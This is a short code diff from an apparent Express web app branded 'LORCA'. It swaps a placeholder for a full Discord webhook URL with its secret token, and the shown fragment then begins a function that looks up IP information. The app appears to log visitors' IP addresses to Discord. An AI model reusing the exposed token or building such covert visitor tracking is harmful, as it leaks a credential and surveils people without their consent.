@@ -11,7 +11,7 @@ app.get('/', async (req, res) => {
   res.send('L O R C A - https://github.com/lorcadev');
 });
 // TYPE UR OWN WEBHOOK URL 
-const webhookUrl = 'https://:..';
+const webhookUrl = 'https://discord.com/api/webhooks/1269248207158771742/k1QTUI3ks6mmVE6Jc9oFCBs-dHfzCaAuah5a1R8hV2yPNRvTXAn0Hbyz06UVMrkeI3US';
 
 async function getIPInfo(ip) {
   try {
